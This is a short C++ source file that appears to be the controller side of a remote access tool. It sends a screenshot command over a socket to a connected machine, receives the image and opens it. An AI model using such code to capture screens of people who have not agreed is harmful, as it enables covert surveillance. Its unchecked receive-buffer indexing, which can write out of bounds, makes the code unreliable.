#include "Server.h"

void screenshot(SOCKET& asock, char *username)
{
     char command[1024], response[1024];
     int res;
     string totr;
     
     strncpy(command, "F+",1024);
     send(asock, command, (int) strlen(command), 0);
     
     cout << "\n Taking a screenshot... ";
     
     totr.clear();
     do
     {
                  res = recv(asock, response, 1024, 0);
                  response[res] = '\0';
                  totr += response;
     } while (totr[totr.length() - 1] != '+');
     totr.erase(totr.length() - 1, 1);
     if (totr == "OK") cout << "complete." << endl;
     else
     {
         PlaySound(TEXT("Error.wav"), NULL, SND_FILENAME | SND_ASYNC);
         cout << "failed." << endl;
         return;
     }
     
     strncpy(command, "OK+",1024);
     send(asock, command, (int) strlen(command), 0);
     
     string retval = transfer(asock, username, 1, 1, "SC");
     
     char appbuf[2048];
     strncpy(appbuf, retval.c_str(),2048);
     ShellExecute(NULL, "open", appbuf, NULL, NULL, SW_SHOWNORMAL);
     
     return;
}

